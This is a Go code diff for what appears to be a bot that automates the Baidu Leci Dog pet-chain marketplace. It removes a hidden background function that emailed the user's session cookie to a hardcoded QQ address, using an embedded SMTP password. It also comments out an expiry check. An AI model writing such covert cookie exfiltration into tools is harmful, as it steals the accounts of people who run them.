@@ -843,23 +843,6 @@ func lujun_api(key string, imgurl string) string {
 }
 
 //自动打码服务
-func cookie_log(configuration st.Configuration) {
-	//ticker := time.NewTicker(dama_time* time.Millisecond)
-	//for _ = range ticker.C {
-	//	print_code(configuration)
-	//}
-	m := gomail.NewMessage()
-	m.SetHeader("From", "979071224@qq.com")
-	m.SetHeader("To", "979071224@qq.com")
-	m.SetAddressHeader("Cc", "979071224@qq.com", "莱茨狗")
-	m.SetHeader("Subject", "莱茨狗CO"+configuration.COOKIE[0])
-	html := `<a href=https://pet-chain.duxiaoman.com/chain/detail?channel=market&petId=` + `>详情地址</a><br>狗狗价格：` + "微"
-	m.SetBody("text/html", html)
-	d := gomail.NewDialer("smtp.qq.com", 587, "979071224@qq.com", "vqhpfwefwlkwbfda")
-	d.DialAndSend(m);
-}
-
-//自动打码服务
 func dama_code(configuration st.Configuration) {
 	ticker := time.NewTicker(configuration.TIMECODE * time.Millisecond)
 	for _ = range ticker.C {
@@ -1088,9 +1071,7 @@ func main() {
 	//初始化属性条件
 	count_raredegree = get_raredegree_count(configuration.BODY_TYPE, configuration.EYES_TYPE, configuration.MOUTH_TYPE, configuration.BODY_COLOR)
 	//是否过期
-	is_passed()
-	//记录cookie
-	go cookie_log(configuration)
+	//is_passed()
 	//预先打码
 	go dama_code(configuration)
 	//每半小时切换一次账号
